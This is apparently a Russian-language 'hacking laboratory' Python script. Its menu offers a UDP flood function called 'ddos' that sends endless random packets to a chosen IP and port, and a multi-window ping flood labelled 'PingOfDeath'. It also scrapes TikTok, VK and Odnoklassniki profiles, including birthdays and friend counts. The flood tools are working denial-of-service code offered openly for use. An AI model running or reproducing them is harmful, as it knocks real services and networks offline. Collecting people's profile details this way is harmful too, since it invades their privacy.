from colorama import init
from colorama import Fore, Back, Style
import time
import os
import requests
from bs4 import BeautifulSoup
import random
import socket
import threading
import webbrowser
import lxml

init(autoreset=True)


def art():
    print(Fore.RED + '''


	██████╗  ██╗███╗   ███╗ ██████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗            
	██╔══██╗███║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝            
	██║  ██║╚██║██╔████╔██║██║   ██║██╔██╗ ██║██║     ███████║█████╗  ██║     █████╔╝             
	██║  ██║ ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗             
	██████╔╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗            
	╚═════╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝            
	██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                                         
	██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                                         
	███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                                        
	██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                                        
	██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                                        
	╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                         
	██╗      █████╗ ██████╗  ██████╗ ██████╗  █████╗ ████████╗ ██████╗ ██████╗ ██╗███████╗███████╗
	██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║██╔════╝██╔════╝
	██║     ███████║██████╔╝██║   ██║██████╔╝███████║   ██║   ██║   ██║██████╔╝██║█████╗  ███████╗
	██║     ██╔══██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗██║██╔══╝  ╚════██║
	███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║███████╗███████║
	╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝''')


def checker():
    url = input('URL: ')
    getbrowser = 'https://check-host.net/check-http?host=' + url
    webbrowser.open(getbrowser, new=2)
    print('Готово!')


def ping():
    host = input('Хост: ')
    packets = input('Размер пакетов: ')
    threads = int(input('Количество окон: '))
    for i in range(threads):
        os.system('start ping ' + host + ' -l ' + packets + ' -t')

def tiktokparsing():
    username = input('TikTok username (without @): ')
    link = 'https://socialblade.com/tiktok/user/' + username
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(link, headers=headers)
    soup = BeautifulSoup(response.text, 'lxml')
    if soup.find('div', attrs={'style': 'width: 800px; padding: 40px; background: #ddac99; margin: 0px auto; color:#fff; text-align: center; font-weight: bold;'}) is not None:
        print(Fore.RED + 'У этого аккаунта меньше 25000 тысяч подписчиков, поэтому его нет в базе данных.')
    else:
        unwanted = soup.find('div', attrs={'style': 'float: right; opacity: 0.7; font-weight: bold;'})
        unwanted.extract()
        infos = soup.find_all('div', class_='YouTubeUserTopInfo')
        counts = []

        for i in infos:
            itemName = i.find('span', class_='YouTubeUserTopLight')
            itemCount = i.find('span', attrs={'style': 'font-weight: bold;'})
            print(f'{itemName.text}: {itemCount.text}')
            counts.append(f'{itemName.text}: {itemCount.text}')

        saveit = input('Сохранить в TXT файл? (y or n): ')
        if saveit == 'Y' or saveit == 'y':
            with open('TikTokData.txt', 'w') as file:
                file.write('Username: ' + username + '\n' + '\n'.join(counts))
                file.close()

def vkparsing():
    url = input('VK (url): ')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'lxml')
    name = soup.find('h1', class_='page_name').text
    infos = soup.find_all('a', class_='page_counter')
    counts = []
    print(name)

    for i in infos:
        itemName = i.find('div', class_='label')
        itemCount = i.find('div', class_='count')
        print(f'{itemName.text}: {itemCount.text}')
        counts.append(f'{itemName.text}: {itemCount.text}')
    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('VKdata.txt', 'w') as file:
            file.write('URL: ' + url + '\n' + '\n'.join(counts))
            file.close()

def okparsing():
    url = input('OK (url): ')
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    name = soup.find('a', class_='profile-user-info_name')
    birthday = soup.find('div', attrs={"data-type": "AGE"})
    living = soup.find('div', class_="user-profile_i_value ellip", attrs={"data-type": "TEXT"})
    photo = soup.find('a', class_='recent-photos_total-counter')
    friends = soup.find('a', attrs={"data-l": "outlandermenu,friendFriend"}).find('span')
    groups = soup.find('a', attrs={"data-l": "outlandermenu,friendAltGroup"}).find('span')
    games = soup.find('a', attrs={"data-l": "outlandermenu,friendApps"}).find('span')

    print('Пользователь: ' + name.text)
    print('Дата рождения: ' + birthday.text)
    print('Количество друзей: ' + friends.text)
    print('Количество групп: ' + groups.text)
    print('Количество фотографий: ' + photo.text)
    print('Количество игр: ' + games.text)
    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('OKdata.txt', 'w') as file:
            file.write('URL: ' + url + '\nПользователь: ' + name.text + '\nДата рождения: ' + birthday.text + '\nКоличество друзей: ' + friends.text + '\nКоличество групп: ' + groups.text + '\nКоличество фотографий: ' + photo.text + '\nКоличество игр: ' + games.text)
            file.close()

def ddos(ip, port, times):
    data = random._urandom(1024)
    while True:
        i = random.choice(('[*]', '[!]', '[#]'))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(i + ' Sent!')
        except:
            print('[@] Error!')


art()

while True:
    time.sleep(1.25)
    start = input('''
    
    ╔═══[root@Hacker]
    ╚══> ''')
    if start == 'help':
        print(Fore.GREEN + '''
		$ checkhost - проверка хоста на работоспособность
		$ ping - нагрузка сервера многопоточными Ping запросами (PingOfDeath)
		$ tiktokpasrser - парсинг данных с ТикТока
		$ vkpasrser - парсинг данных с ВКонтакте
		$ okparser - парсинг данных с одноклассников
		$ udpflood - атака на IP до отказа (UDP)
		$ clear - очистка консоли
		''')
        pass
    if start == 'checkhost':
        os.system('cls')
        checker()
    if start == 'ping':
        os.system('cls')
        ping()
    if start == 'okparser':
        os.system('cls')
        okparsing()
    if start == 'clear':
        os.system('cls')
        pass
    if start == 'udpflood':
        os.system('cls')
        ip = str(input('IP: '))
        port = int(input('Port: '))
        threadspg = int(input('Threads: '))
        times = int(input('Times: '))
        for y in range(threadspg):
            th = threading.Thread(target = ddos(ip, port, times))
            th.start()
    if start == 'tiktokparser':
        os.system('cls')
        tiktokparsing()
    if start == 'vkparser':
        os.system('cls')
        vkparsing()
